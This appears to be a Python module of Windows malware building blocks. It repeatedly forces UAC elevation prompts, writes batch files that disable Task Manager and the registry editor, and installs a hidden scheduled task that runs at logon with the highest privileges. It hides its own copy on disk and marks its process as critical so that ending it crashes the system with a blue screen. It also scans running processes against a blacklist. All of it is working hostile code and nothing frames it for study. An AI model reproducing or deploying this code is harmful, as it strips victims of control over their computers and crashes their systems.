import os
import sys
import shutil
import ctypes
import subprocess
from ctypes import *


# Variables

Admin = ctypes.windll.shell32.IsUserAnAdmin() != 0


# Run as administrator

def WhileRunAS(File):
 while True:
  try:
   os.startfile(File, 'runas')
  except:
   pass
  else:
   break


# Check if the script is run as administrator

def AdminChecker(Admin):
 if Admin is False:
  sys.exit()


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager(ProgramData):
 with open(os.path.join(ProgramData, 'DisableTaskManager.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'])

def RegeditDisableRegistryTools(ProgramData):
 with open(os.path.join(ProgramData, 'DisableRegistryTools.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])


# Adding a script to startup

def AddToAutorun(AutorunName, InstallPath, ProcessName, CurrentPath, Temp):
 with open(os.path.join(Temp, 'AutorunEnabled.bat'), 'w') as OPATH:
   OPATH.writelines([
       'schtasks /create /f /sc onlogon /rl highest /tn "'+AutorunName+'" /tr "'+InstallPath+'\\'+ProcessName+'"'])
 while True:
  try:
   os.startfile(Temp+'AutorunEnabled.bat', 'runas')
  except:
   pass
  else:
   shutil.copy2(CurrentPath, r''+InstallPath+'\\'+ProcessName)
   ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 2)
   break


# MessageBox Output

def MessageBox(MessageTitle, Message):
 ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageTitle, 0x10)


# Protect process with BSoD (if killed)

def SetProtection():
 windll.ntdll.RtlAdjustPrivilege(20, 1, 0, byref(c_bool()))
 windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def UnsetProtection():
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0


# BSoD if a forbidden process is open

def List():
 processes = []
 process = subprocess.check_output("@chcp 65001 1> NUL && @TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"",
     shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding="utf8", errors="strict")
 for processNames in process.split(' '):
  if ".exe" in processNames:
   proc = processNames.replace("K\r\n", '').replace("\r\n", '')
   processes.append(proc)
 return processes

def CheckProcess(BlacklistedProcesses):
 for process in List():
  if process.lower() in BlacklistedProcesses:
   return True
 return False
